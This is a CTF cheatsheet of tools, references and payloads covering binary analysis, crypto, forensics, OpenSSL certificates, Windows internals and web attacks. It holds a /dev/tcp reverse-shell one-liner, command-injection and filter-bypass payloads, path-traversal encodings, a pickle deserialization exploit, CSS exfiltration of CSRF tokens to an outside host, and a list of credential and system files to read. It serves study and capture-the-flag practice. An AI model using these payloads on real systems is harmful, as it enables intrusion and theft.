# Cybersecurity Cheatsheet
This is a payload collection and references for CTF challenges.
- Guide
  - [HackTricks](https://book.hacktricks.xyz/welcome/readme)  
  - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
  - [Bamboofox](https://bamboofox.cs.nctu.edu.tw/courses)
  - [Computer Security](https://edu-ctf.csie.org/)
  - [Hacker101](https://www.hacker101.com/resources)
- Practice
  - [CTF Time](https://ctftime.org/)
  - [Google CTF](https://capturetheflag.withgoogle.com/)
  - [picoCTF](https://play.picoctf.org/)
  - [OverTheWire](https://overthewire.org/wargames/)
  - [pwnable.tw](https://pwnable.tw/)
  - [Hack The Box](https://www.hackthebox.com/)
  - [prompt(1) to win](https://prompt.ml/0)
  - [TryHackMe](https://tryhackme.com)
- Real World
  - [Hackerone Bug Bounty](https://hackerone.com/directory/programs)
  - [SOCPrime](https://socprime.com/)
  - [AlienVault](https://otx.alienvault.com/)
  - [Anomali](https://www.anomali.com/)
  - [MITRE ATT&CK](https://attack.mitre.org/)
- Certification
  - CEHP
  - OSCP
  - C|PENT
- News
  - [CISA](https://www.cisa.gov/)
  - [BleepingComputer](https://www.bleepingcomputer.com/)
  - [The Hacker News](https://thehackernews.com/)
  - [PENETRATION TESTING BLOG](https://securityonline.info/)


## Binary


### Tool


#### File Analyzer
- General
  - `$ file`
  - `$ c++filt`
- ELF
  - `$ readelf -S <binary>`
  - `$ objdump -R <binary>`
  - `$ objdump -d <binary>`
- PE Viewer
  - reshacker
  - CFF Explorer (ExplorerSuite)
  - PE Detective (ExplorerSuite)
  - Signature Explorer (ExplorerSuite)
  - PE-bear
  - PEview
  - 010 editor
- Pack Detector
  - PEiD
  - DIE (detect it easy)
    - identify shell and other info


#### Decompiler
- [Decompiler Explorer Online](https://dogbolt.org/)
- [Compiler Explorer Online](https://godbolt.org/)
- jad
- uncompyle6
- [dnSpy](https://github.com/dnSpy/dnSpy) (.Net Framwork)
- Telerik/JustAssembly


#### Debugger
- IDA pro
  - Command
    | Key                                                  | Comment                |
    |:-----------------------------------------------------|:-----------------------|
    | `<S-F1>`                                             | set variable structure |
    | `<S-F12>`                                            | string list            |
    | `r` / `h`                                            | encode                 |
    | `x`                                                  | xrefs                  |
    | `y`                                                  | type declaration       |
    | `<C-f>`                                              | search                 |
    | `<R>` > reset pointer type > create  new struct type |                        |
  - [IDA Skins](https://github.com/zyantific/IDASkins)
- Ghidra
- Windbg preview
- x64dbg
  | Key         | Comment      |
  |:------------|:-------------|
  | `<space>`   | modify code  |
  | `<C-p>`     | patch binary |
  | `<R>` > `s` | search       |
- gdb
  - command
    | Cmd    | Comment |
    |:-------|:--------|
    | watch  |         |
    | rwatch |         |
    | awatch |         |
    | x/[N][g,w,h,b]x | |
  - plugins
    - peda
    - gef
    - pwndbg
    - pwngdb
- CheatEngine72


#### Running Environ
- x86 binary on x64 OS
  - `$ sudo apt install mingw-w64`
    - `/usr/x86_64-w64-mingw32/include`
    - `/usr/i686-w64-mingw32/include`
- Library
  - `$ patchelf --set-interpreter ./libc/ld-linux.so.2 --set-rpath ./libc/ <bin>`
  - `$ env LD_PRELOAD=<lib> <bin>`
- API Hook
  - [Microsoft Research Detours Package](https://github.com/microsoft/Detours)
  - pintool
  - strace / ltrace


#### Payload
- pwntools
- one\_gadget
- angr


### Background


#### Calling Convention
- Compare
  | Type                             | Platform            | Ret     | Parameters                  | Stack Cleaner | Note                                      | 
  |----------------------------------|---------------------|---------|-----------------------------|---------------|-------------------------------------------|
  | stdcall                          | Win32 API           | eax     | stack                       | callee        |                                           |
  | cdecl                            | Win32 / Linux x86   | eax     | stack                       | caller        |                                           |
  | Microsoft x64 calling convention | Win64               | rax     | rcx,rdx,r8,r9,stack         | caller        |                                           |
  | SysV ABI (C ABI)                 | Linux x86\_64       | rdx:rax | rdi,rsi,rdx,rcx,r8,r9,stack | caller        | called when 16-byte aligned               |
  | syscall                          | Linux x86\_64       | rax     | rdi,rsi,rdx,r10,r8,r9,stack | caller        | rax: syscall number, rcx: rip, r11: flags |
  | int 0x80                         | Linux x86           | eax     | ebx,ecx,edx,esd,edi,ebp     | caller        | eax: syscall number                       |

- Win32 Calling Convention Example
  - stdcall (win32api)

    ```c
    __attribute__((stdcall)) void func(int a, int b, int c) {
      ...
    }
    ```

  - fastcall

    ```c
    __attribute__((fastcall)) void func(int a, int b, int c) {
      ...
    }
    ```

  - thiscall
    > put `this` in `ecx`
    > 
    > used in class member method

    ```
    class human {
      protected:
      string nation;
      public:
      virtual string getNation() {
        return this->nation;
      }
    };
    ```

    ```
    lea edx,[ebp-0x34]
    ...
    mov ecx,edx
    call eax
    ...
    ```

#### File Format
- segment register / index in descripter table

##### ELF

##### PE
- Alignment
  - File
    - FileAlignment: 0x200
    - Winchester Disk
  - Process
    - SectionAlignment: 0x1000
    - Page Model
- [PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
  | Layout  |                               |
  |:--------|:------------------------------|
  | Headers | Dos MZ Header                 |
  |         | DOS Stub                      |
  |         | PE Header (IMAGE\_NT\_HEADER) |
  |         | Section Headers               |
  | Null    |                               |
  | .text   |                               |
  | Null    |                               |
  | .data   |                               |
  | Null    |                               |
  | .rsrc   |                               |
  | Null    |                               |


### Buffer Over Flow


### Fuzzing


## Crypto


### Tool


#### Decrypt
- pyCryptodome
- Crypto.Util.number
  | Function | Comment         |
  |:---------|:----------------|
  | inverse  | modulus inverse |
- Sage
  - [sagemath](https://sagecell.sagemath.org/)
  - [CoCalc](https://cocalc.com/)


#### Brute Force
- hashcat
- hydra
  - crunch
- unt-wister


#### Certificate
- Generate
  > [Generate cert chain](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/)  
  > [SAN](https://medium.com/@antelle/how-to-generate-a-self-signed-ssl-certificate-for-an-ip-address-f0dd8dddf754)  
  > /etc/ssl/openssl.cnf

  - Self-signed Certificate (Root CA)

    ```bash
    #CA
    openssl genrsa -out ca.key 4096
    openssl req -new -out ca.csr -sha256 \
      -key ca.key -nodes \
      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name"

    openssl ca -selfsign -keyfile ca.key -in ca.csr -outdir . -out ca.crt \
      -startdate 20211001000000Z -enddate 20311001000000Z -config <(cat <<-EOF
    [ ca ]
    default_ca                   = CA_default

    [ CA_default ]
    database                     = ./index.txt
    email_in_dn                  = no
    rand_serial                  = yes
    default_md                   = sha256
    default_days                 = 730
    policy                       = policy_any

    [ policy_any ]
    countryName                  = supplied
    stateOrProvinceName          = optional
    organizationName             = optional
    organizationalUnitName       = optional
    commonName                   = supplied
    emailAddress                 = optional

    EOF
    )

    #CA in one command
    openssl req -new -out ca.crt -sha256 \
      -newkey rsa:4096 -nodes -keyout ca.key \
      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name" \
      -x509 -days 7300
      ```

  - Sign certificate

    ```bash
    #CSR
    openssl req -new -out intermediate.csr -sha256 \
      -newkey rsa:4096 -nodes -keyout intermediate.key \
      -subj "/C=TW/ST=Taiwan/L=Hsinchu/O=Organization/OU=Organization Unit/CN=Common Name" \
      -config <(cat <<EOF
    [ req ]
    ...
    EOF
    )

    #CRT
    openssl x509 -req -out intermediate.crt -in intermediate.csr -days 7300 \
      -CA ca.crt -CAkey ca.key -CAserial ca.serial -CAcreateserial \
      -extensions x509v3_config -extfile <(cat <<EOF
    [ x509v3_config ]
    subjectKeyIdentifier = hash
    authorityKeyIdentifier = keyid:always,issuer
    basicConstraints = CA:true, pathlen:0
    EOF
    )
      ```

  - Sign CRL

    ```bash
    #CRL
    openssl ca -gencrl -keyfile ca.key --cert ca.crt -out crl.pem \
      -crlexts crl_ext --crldays 730 -revoke ${CRT_PATH} -config <(cat <<EOF
    [ ca ]
    default_ca                   = CA_default

    [ CA_default ]
    database                     = ./index.txt
    default_md                   = sha256

    [ crl_ext ]
    authorityKeyIdentifier       = keyid:always,issuer:always
    EOF
    )
    ```
  
- Verify
  - Cert Chain

    ```bash
    openssl verify -CAfile root.crt -untrusted intermediate.crt product.crt
    openssl verify -CAfile <(cat intermediate.crt root.crt) product.crt

    openssl verify -crl_check -CAfile <(cat ca.crt crl.pem) intermediate.crt
    ```

  - Cert Pair

    ```bash
    printf '123' \
      | openssl rsautl -encrypt -inkey <(openssl x509 -pubkey -noout -in sensor.crt) -pubin \
      | openssl rsautl -decrypt -inkey sensor.key
    ```

  - CRL

    ```bash
    openssl s_client \
      -CAfile <(cat ca.crt crl.pem) \
      -crl_check -connect 127.0.0.1:12345 \
    ```

- Read cert

  ```bash
  openssl x509 -in product.crt -noout -text
  ```

- TLS Server / Client
  - Basic

    ```bash
    openssl s_server -key server.key -cert server.crt [-accept <ip>:<port>]
    openssl s_client [-showcerts] -connect <ip>:<port>
    ```

  - Verify Server

    ```bash
    openssl s_server [-debug] \
      -CAfile root.crt \
      -cert_chain <(cat product.crt intermediate.crt) \
      -cert server.crt -key server.key \
      [-accept <ip>:<port>]

    openssl s_client [-showcerts] \
      -CAfile root.crt \
      -verify_return_error \
      -connect <ip>:<port>
    ```

  - Mutual Auth

    ```bash
    #Server Alternative 1
    openssl s_server [-debug] \
      -CAfile root.crt \
      -cert_chain <(cat product.crt intermediate.crt) \
      -cert server.crt -key server.key \
      -verify_return_error -Verify 5 \
      [-accept <ip>:<port>]

    #Server Alternative 2
    socat "OPENSSL-LISTEN:8888,cafile=root.crt,certificate=client-chain.crt,key=client.key,reuseaddr,verify" STDOUT

    #Client Alternative 1
    openssl s_client [-showcerts] \
      -CAfile root.crt \
      -cert_chain <(cat product.crt intermediate.crt) \
      -cert client.crt -key client.key \
      -verify_return_error \
      -connect <ip>:<port>

    #Client Alternative 2
    curl \
      --cacert root.crt \
      --cert <(cat client.crt product.crt intermediate.crt) \
      --key client.key \
      --resolve <Cert CN>:<port>:<ip>
      https://<Cert CN>:<port>

    ```
    
- MakeCert and New-SelfSignedcertificate

  ```
  #MakeCert -n 'CN=code.signing' -ss My -r -pe -sr localmachine -cy end -eku 1.3.6.1.5.5.7.3.3 -len 4096 -b 2020/01/01 -e 2025/01/01
  New-SelfSignedCertificate -CertStoreLocation 'Cert:\CurrentUser\My' -KeyAlgorithm RSA -KeyLength 4096 -Type CodeSigningCert -KeyUsage DigitalSignature -KeyUsageProperty Sign -Subject 'CN=code signing test'
  Set-AuthenticodeSignature -FilePath @(Get-ChildItem -Recurse '*.exe','*.dll','*.ps1') -Certificate (Get-ChildItem Cert:\CurrentUser\My -codesigning)[0] -IncludeChain 'NotRoot' -HashAlgorithm SHA256 -TimestampServer 'http://timestamp.globalsign.com/?signature=sha2'
  signtool.exe verify /pa <binary>
  ```


### Background


#### Cryptanalysis
- Kerckhoff's Principle
- Classical Cryptanalysis
  - Mathmatical Analysis
  - Brute-Force Attacks
    - Substitution Cipher
      > Caesar Cipher

      - Exhaustive Key Search
      - Letter Frequency Analysis
- Implementation Attacks
- Social Engineering


#### Symmetric Cipher
- Stream Cipher
  > encrypt bits individually
  > 
  > usually small and fast  
  > 
  > security dependes entirely on key stream (sync, async), which is random and reproducible
  
  - vulnerable to reused key attack

    ```
    E(A) = A xor C
    E(B) = B xor C
    E(A) xor E(B) = A xor B
    ```

  - key stream generator
    > the key stream generator works like a Pseudorandom Number Generator (RNG),
    > which generate sequences from initial seed (key) value
    > 
    > ![](<https://latex.codecogs.com/gif.latex?s_0 = seed, s_{i+1} = f(s_i, s_{i-1}, ..., s_{i-t})>)
  
    - Linear Congruential Generator (LCG)
    
      ![](<https://latex.codecogs.com/gif.latex?S_0 = seed, S_{i+1} = AS_i + B\ mod\ m>)  
    
      Assume
      - unknown A, B and S0 as key
      - m = 2^32
      - S1, S2, S3 are known  
    
      Solving  
      - ![](<https://latex.codecogs.com/gif.latex?S_2 = AS_1 + B\ (mod\ m)>)
      - ![](<https://latex.codecogs.com/gif.latex?S_3 = AS_2 + B\ (mod\ m)>)
    
      Answer
      - ![](<https://latex.codecogs.com/gif.latex?A = (S_2 - S_3) \times inverse(S_1 - S_2, m)\ (mod\ m)>)
      - ![](<https://latex.codecogs.com/gif.latex?B = (S_2 - AS_1)\ (mod\ m)>)
    
    - MT19937
      > python's default RNG

      - can be recovered by 32x624 consecutive bits
        - `from randcrack import RandCrack`

    - Lineare Feedback Shift Register (LFSR)

      ![](<https://latex.codecogs.com/gif.latex?S_{i+3} = S_{i+1} \oplus S_{i}>)
      
      - Characteristic Polynomial
        - ![](<https://latex.codecogs.com/gif.latex?P(x) = x^m + p_{m-1}x^{m-1} + ... + p_1x + p_0>)


- Block Cipher
  > - always encrypt a full block (several bits)
  > - common for internet applications


## Misc


### Tool


#### Binary Forensic
- binwalk 
- polyfile
  - `polyfile <file>.pdf --html <file>.html`
- [file signature](https://filesignatures.net/)
  > `47 49 46 38` GIF8
  >
  > `89 50 4e 47` .PNG
- [Stego](https://0xrick.github.io/lists/stego/)
  - zsteg
  - stegsolve.jar
- `qpdf --qdf --object-streams=disable <infile> <outfile>`


### QRcode
- Content
- Encode


## System


### Tool


#### Malware Scanner
- [Microsoft Safety Scanner](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/safety-scanner-download)
- [Trend Micro Anti-Threat Toolkit](https://www.trendmicro.com/zh_tw/business/capabilities/solutions-for/ransomware/free-tools.html)
- [VirusTotal](https://www.virustotal.com/gui/)
- [nodistribute](https://nodistribute.com/)


#### System Forensic
- wireshark
- autopsy
- sleuthkit
- OSForensic
- regsnap
- Process Monitor (SysinternalsSuite)
- Porcess Explorer (SysinternalsSuite)
- WinObj (SysinternalsSuite)
- Task Explorer (ExplorerSuite)
- Driver List (ExplorerSuite)
- FTK Imager


#### Vulnerability Assessment
- OpenVAS
- metasploit
- nmap
- cobaltstrike


### Background


#### Windows
> https://lolbas-project.github.io/

- `SET __COMPAT_LAYER=RunAsInvoker`
- File
  - `fsutil file queryfileid <file>`
  - `$(Get-Item filename).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")`
- NTFS Stream
  > [NTFS File Structure](https://www.researchgate.net/profile/Costas_Katsavounidis2/publication/363773832_Master_File_Table_MFT_on-disk_Structures_NTFS_31_httpsgithubcomkacos2000MFT_Browser/links/632da89086b22d3db4d9afad/Master-File-Table-MFT-on-disk-Structures-NTFS-31-https-githubcom-kacos2000-MFT-Browser.pdf)  
  > [NTFS Streams](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3)  
  > [File Streams (Local File Systems)](https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams)  
  - `fsutil file layout <file>`
  - Extended Attribute
    - `fsutil file queryEA <file>`
    - WSL metadata
  - Alternative Data Stream
    ```cmd
    echo abc > note.txt:abc.txt
    echo C:\Windows\System32\cmd.exe > note.txt:cmd.exe
    dir /R

    wmic process call create note.txt:cmd.exe
    forfiles /M note.txt /C "note.txt:cmd.exe"

    Get-Content note.txt -stream abc.txt
    more < note.txt:abc.txt:$DATA
    ```
- [Naming Files, Paths, and Namespaces](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file)
  - Namespace
    - Win32 File Namespace
      - `\\?\`
        > tells the Windows APIs to disable all string parsing and to send the string that follows it straight to the file system
      - `\\?\GLOBALROOT\Device\ConDrv\Console`
        > `\\?\GLOBALROOT` ensures that the path following it looks in the true root path of the system object manager and not a session-dependent path
    - Win32 Device Namespace
      - `\\.\`
        > access the Win32 device namespace instead of the Win32 file namespace
    - NT Namespace
      - `\??\` 
        > NT Object Manager paths that can look up DOS-style devices like drive letters
        > 1. process's `DosDevices` table
        > 2. `\GLOBAL??` Object Manager directory
        >
        > A "fake" prefix which refers to per-user Dos devices
        >
        > ![file path handling, user / kernal mode](https://i.stack.imgur.com/LOeeO.png)
      - | Path         | Content             |
        |:-------------|:--------------------|
        | `\Global??\` | Win32 namespace     |
        | `\Device\`   | Named device object |
  - Reserved Name (`\Global??\`)
    | Filename | Meaning |
    |:----|:---------------------------|
    | CON | console (input and output) |
    | AUX | an auxiliary device. In CP/M 1 and 2, PIP used PUN: (paper tape punch) and RDR: (paper tape reader) instead of AUX: |
    | LST | list output device, usually the printer |
    | PRN | as LST:, but lines were numbered, tabs expanded and form feeds added every 60 lines |
    | NUL | null device, akin to /dev/null |
    | EOF | input device that produced end-of-file characters, ASCII 0x1A |
    | INP | custom input device, by default the same as EOF: |
    | OUT | custom output device, by default the same as NUL: |
- wmi
  - `wbemtest.exe`
- Remote Command
  - psexec
    - Make sure `\\<host>\admin$` can be accessed

    ```psh
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
    netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
    psexec \\host -u <user> -p <pass> -i [SessID] <cmd>
    ```

  - wmic

    ```psh
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
    netsh firewall set service remoteadmin enable
    wmic /node:<host> /user:<user> /password:<pass> process call create <cmd>
    ```

- Windows Event
  - Sysmon
    - [SysmonSimulator](https://rootdse.org/posts/understanding-sysmon-events/)

- minifilter
- WFP

#### Linix/Unix
> https://gtfobins.github.io/

#### macOS
- Resource Fork
- Named Fork
- Data Fork

### DLL Injection
- [Injecting API Hooking Attack with DLL Injection | S12 - H4CK](https://medium.com/@s12deff/injecting-api-hooking-attack-with-dll-injection-897548af47a8)
- [Malware Technique: DLL Injection | Ricky Severino](https://rickyseverino.medium.com/malware-technique-dll-injection-ffcb960ab2a1)
  ```mermaid
  flowchart

  malproc((malicious process))

  malproc --> GetCurrentProcess --handle--> OpenProcessToken --handle--> AdjustTokenPrivileges
  malproc --SE_DEBUG_NAME--> LookupPrivilegeValue --LUID--> AdjustTokenPrivileges

  malproc --target process name--> CreateToolhelp32Snapshot --pid--> OpenProcess --hProcess--> VirtualAllocEx --lpRemoteMemory--> WriteProcessMemory
  malproc --injected dll path-->GetFullPathName --path--> WriteProcessMemory

  malproc --kernel32.dll--> GetModuleHandle --hKernel32--> GetProcAddress --lpLoadLibrary--> CreateRemoteThread
  OpenProcess --hProcess--> CreateRemoteThread
  VirtualAllocEx --lpRemoteMemory--> CreateRemoteThread --> dll((injected dll))

  AdjustTokenPrivileges -. needed when process owned by another account .-> VirtualAllocEx
  WriteProcessMemory -.-> CreateRemoteThread
  ```


## Web
> [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)  
> [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)  
> [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)  
> [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)  
> [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)
> [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)


### Tool


#### Recon
- Target
  - [SHODAN](https://www.shodan.io/)
    > Search Engine for the Internet of Everything
  - [Censys](https://search.censys.io/)
    > Censys helps organizations, individuals, and researchers find and monitor
    > every server on the Internet to reduce exposure and improve security
  - Google Hacking
    - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
- Site Information
  - maltego
  - [Netcraft Site Report](https://sitereport.netcraft.com/)
  - [crt.sh](https://crt.sh/)
    > Enter an Identity (Domain Name, Organization Name, etc)
  - [IANA WHOIS Service](https://www.iana.org/whois)
  - [DomainTools](https://whois.domaintools.com/)
- DNS
  - drill
  - dig
  - nslookup
  - host
  - dnsenum
  - knockpy.py
  - [dnsdumpster](https://dnsdumpster.com/)
  - [robtex](https://www.robtex.com/)
    - Subdomains
- Crawler
  - dirb
  - DirBuster
  - git-dumper
  - wfuzz
    ```bash
    wfuzz -c -z file,/raft-large-files.txt -hc 404 "${URL}"
    ```
  - ffuf


#### Payload
- Burpsuit
- [Exploit DB](https://www.exploit-db.com/)
- c-jwt-cracker
- Scanner
  - sqlmap
  - xsser
  - ZAP
- Backdoor
  - weevely
  - veil
  - BeEF
- Reverse Shell
  - `/bin/sh -i >& /dev/tcp/<HOST>/<PORT> 0<&1`
  - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)


#### Connection
- `/dev/tcp/<HOST>/<PORT>`
- telnet
- nc / ncat / socat
- `$ certutil.exe -urlcache -f <url> <filename>`
- [HTTPie](https://devhints.io/httpie)


#### Public Temp Server
- webhook.site
  - unique URL (https / CORS)
  - unique email
- beeceptor
- hookbin.com
- requestbin.net


### Background
- [Basics of HTTP](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Basics_of_HTTP)
  - MIME
    > type/subtype;parameter=value
- [URI schemes](https://en.wikipedia.org/wiki/List_of_URI_schemes)
  - Data URI
    > data:[\<mediatype\>][;base64],\<data\>

### Broken Access Control
- Insecure Direct Object References (IDOR)

### Cache Poisoning

### Command Injection
- Basic
  - $ ping 127.0.0.1 `; id`
  - $ ping 127.0.0.1 `| id`
  - $ ping 127.0.0.1 `&& id`
  - $ ping '127.0.0.1`'; id #` ' 
  - $ ping "`$(id)`"
  - $ cat mewo.txt `$(id)`
  - $ cat mewo.txt `` `id` ``
  - Newline (0x0A, \n, %0A)
- Space Bypass
  - $ cat`<TAB>`/flag
  - $ cat\</flag
  - $ {cat,/flag}
  - $ cat$IFS/flag
  - $ X=$'cat\x20/flag'&&$X
- Keyword Bypass
  - $ cat /f'la'g
  - $ cat /f"la"g
  - $ cat /f\l\ag
  - $ cat /f\*
  - $ cat /f?a?
  - $ cat ${HOME:0:1}etc${HOME:0:1}passwd

### CRLF Injection
- Inject `\r\n` to headers

  ```txt
  request("http://host/ HTTP/1.1\r\nHeader: xxx\r\nX:")
  -----------------------------------------------------
  GET / HTTP/1.1\r\n
  Header: xxx
  X:` HTTP/1.1\r\n
  Host: host\r\n
  ...
  ```

  ```txt
  ?redirect=http://example.com/%0d%0a%0d%0a...
  --------------------------------------------
  HTTP/1.1 302 Found
  Content-Length: 35\r\n
  Content-Type: text/html; charset=UTF-8\r\n
  ...
  Location: https://example.com\r\n
  \r\n
  <script>alert(1)</script>
  ...
  Server: Apache/2.4.41\r\n
  \r\n
  Redirecting to <a href="/">/</a> ...
  ```

- Redis

  ```
  http://127.0.0.1:6379/%0D%0ASET%20key%20"value"%0D%0A
  -----------------------------------------------------
  SET key "value"\r\n
  ```

### CSRF
- Cookies Security
  - HttpOnly
  - Secure
  - Domain, Path, SameSite
- HTML Element
  - GET: `<img>`, `<iframe>`, `<form>`
  - POST: `<form>`
- JavaScript
  - GET/POST: `fetch`, `XMLHttpRequest`
- Limitation
  - [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)
- Mitigation
  - Same-origin policy (SOP)
    - [SameSite cookies explained](https://web.dev/samesite-cookies-explained/)
    - [SameSite Cookie Changes in February 2020: What You Need to Know](https://blog.chromium.org/2020/02/samesite-cookie-changes-in-february.html)
  - CSRF token

### CSS Injection
- expression()
- import URL (CSRF)
  - Referer
  - url(...)

    ```
    body {
      background:
      url(http://example.com/logout);
    }
    ```

  - ...
- CSS Selector
  > Read part of HTML source, like CSRF Token

  ```css
  input[name=csrf][value^="1"]{background:url(http://ip/1)}   X
  input[name=csrf][value^="2"]{background:url(http://ip/2)}   O
  input[name=csrf][value^="2a"]{background:url(http://ip/2a)} X
  input[name=csrf][value^="2e"]{background:url(http://ip/2e)} O
  ...
  <input type="text" name="csrf" avlue="2e58ca...">
  ```

### Deserialization
- ASP.NET Deserialization
  > `ViewState`, `Session`, ... are highly possible to have serialize data
  > encrypted by `machine key` stored in `web.config`.

  - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- Java
  - Gadgets
    - CommonsCollections
  - Magic Method
    - toString
    - readObject

      ```java
      public class Cat implements Serializable {
        ...
        private vlid readObject(ObjectInputStream in) {
          throws IOException, ClassNotFoundException {
            ...
          }
        }
      }
      ```

    - finalize
    - ...
  - [ysoserial](https://github.com/frohoff/ysoserial)
- PHP
  > Feature removed since PHP 8.0
  - Phar Format
    - stub
    - manifest (... serialized file meta-data, stored in serialize() format ...)
    - contents
    - signature (optional)
  - Magic Method
    - \_\_destruct()
    - \_\_wakeup()
    - \_\_call()
    - \_\_toString()
  - Phar Deserialization`phar://`
    | Trigger               |           |                |
    |:----------------------|:----------|:---------------|
    | file\_get\_contents() | include() | file\_exists() |
    | getimagesize()        | unlink()  | file()         |
    | fopen()               | is\_dir() | ...            |

    - Create phar file by `php --define phar.readonly=0 ${file}`
      ```php
      <?php
        class Cat {}
        $phar = new Phar("pharfile.phar");
        $phar->startBuffering();
        $phar->setStub("<?php __HALT_COMPILER(); ?>");
        $c = new Cat();
        $phar->setMetadata($c);
        $phar->addFromString("meow.txt", "owo");
        $phar->stopBuffering();
      ?>
      ```
  - [POP Chain](https://github.com/ambionics/phpggc)
- Python
  - Magic Method
    - \_\_reduce\_\_()
  - pickle
    > Stack-based virtual pickle machine

    ```python
    class Exploit(object):
      def __reduce__(self):
        return (os.system, ('id', ))

    serialized = pickle.dumps(Exploit())
    pickle.loads(serialized)
    #pickletools.dis(serialized)
    ```

### DOM Clobbering
- Inject HTML into a page to manipulate the DOM to change the behavior of JavaScript on the page
  - Access by `id` directly or by `windows.id`
    ```html
    <any id="a"></any>
    <script>
      console.log(a)
      console.log(window.a)
    </script>
    ```
  - Access by `document.a` additionally
    ```html
    <img name="a">
    <form name="b"></form>
    <embed name="c">
    <object name="d"></object>
    <script>
      console.log(document.a)
      console.log(document.b)
      console.log(document.c)
      console.log(document.d)
    </script>
    ```
  - Access by combination of `id` and `name`
    ```html
    <any id="a"></any>
    <any id="a" name="b"></any>
    <script>
      console.log(a) // HTMLCollection[]
      console.log(a.a)
      console.log(a.b)
    </script>
    ```
  - Access multi-layer windows object
    ```html
    <iframe name="a" srcdoc='
      <iframe name="b" srcdoc="
        <iframe name=&amp;quot;c&amp;quot; srcdoc=&amp;quot;
          <a id=d></a>
        &amp;quot;></iframe>
      "></iframe>
    '></iframe>
    <script>
      console.log(a.b.c.d)
    </script>
    ```

- Case Study
  - [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)

### HTTP Desync Attacks

### Local File Inclusion (LFI)
- RCE
  - [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)
  - access.log / error.log
  - /proc/self/environ `user-agent`
  - phpinfo `tmp file location`
  - /tmp/sess\_{session\_name} `control session content`
  - [session.upload\_progress](https://blog.orange.tw/2018/10/#session-tragedy)
- Trigger `php`
  - require()
  - require\_once()
  - include()
  - include\_once()
- Stream Wrapper
  - `php://filter/<action><filter>/resource=<file>`
    | action    | filter                   |
    |:----------|:-------------------------|
    | \<empty\> | convert.base64-encode    |
    | read=     | string.rot13             |
    | write=    | zlib.deflate             |
    |           | zlib.inflate             |

    ```
    Multiple Filter
    ---------------
    php://filter/read=convert.base64-encode/
                 read=string.rot13/
                 ...
                 resource=phpinfo.php
    ```

  - `php://input`
  - `php://fd`
- Sensitive Files
  - Source Code
  - Version Contorl
    - [.git](https://github.com/arthaud/git-dumper)
    - .svn
    - .bzr
  - Hidden File
    - [.DS\_Store](https://github.com/lijiejie/ds_store_exp)
    - .index.php.swp
  - Unix
    - /etc/hosts
    - /etc/passwd
    - /etc/shadow
    - /proc/net/[tcp,udp]
    - /proc/net/\*
    - /proc/net/arp
    - /proc/net/fib\_trie
    - /proc/net/route
    - /proc/sched\_debug
    - /proc/self/cwd
    - /proc/self/environ
    - /proc/self/exe
    - /proc/self/fd/[num]
  - Web Server Config Files
    - /etc/apache2/apache2.conf
    - /etc/apache2/sites-available/000-default.conf
    - /etc/nginx/nginx.conf
    - /etc/php/php.ini
- Path Bypass
  - Encoding
    | Encoding                        | Payload   | Decode |
    |:--------------------------------|:----------|:-------|
    | unicode/UTF-8 encoding          | %c1%1c    |        |
    |                                 | %c0%af    |        |
    | unicode/UTF-7 encoding          |           |        |
    | overlong UTF-8 unicode encoding | %c0%2e    | `.`    |
    |                                 | %e0%40%ae | `.`    |
    |                                 | %c0ae     | `.`    |
    |                                 | %c0%af    | `/`    |
    |                                 | %e0%80%af | `/`    |
    |                                 | %c0%2f    | `/`    |
    |                                 | %c0%5c    | `\`    |
    |                                 | %c0%80%5c | `\`    |
    | URL encoding                    | %2e%2e%2f | `../`  |
    |                                 | %2e%2e/   | `../`  |
    |                                 | ..%2f     | `../`  |
    |                                 | %2e%2e%5c | `..\`  |
    | double URL encoding             | %252F     | `/`    |
    |                                 | %255C     | `\`    |
    | 16-bit Unicode encoding         | %u002e    | `.`    |
    |                                 | %u2215    | `/`    |
    |                                 | %u2216    | `\`    |
  - Null Bytes
    > bypass file type checking

    - `../../../../../passwd%00.jpg`
  - Mangled Paths
    > bypass removing traversal sequences

    - `....//`
    - `...\//`
    - `..//..//..\`        
  - Nginx Misconfiguration
    > Nginx off-by-slash fail
    >
    > `http://127.0.0.1/static../settings.py` => `/home/app/static/../settings.py`
    
    ```
    location /static {
      alias /home/app/static/;
    }
    ```

- Extension Bypass
  - pHP
  - pht, phtml, php[3,4,5,7]
  - html, svg
  - Apache2 Feature
    > xxx.abc => run as php file

    ```
    .htaccess
    ---------
    <FilesMatch "abc">
      SetHandler application/x-httpd-php
    </FilesMatch>
    ```

        
### Prototype Pollution
- `a = new A()`
  - `a`.  \_\_proto\_\_ === `A`.prototype
- `undefined` may be replaced when its prototype has the attribute.
- Trigger
  - Set
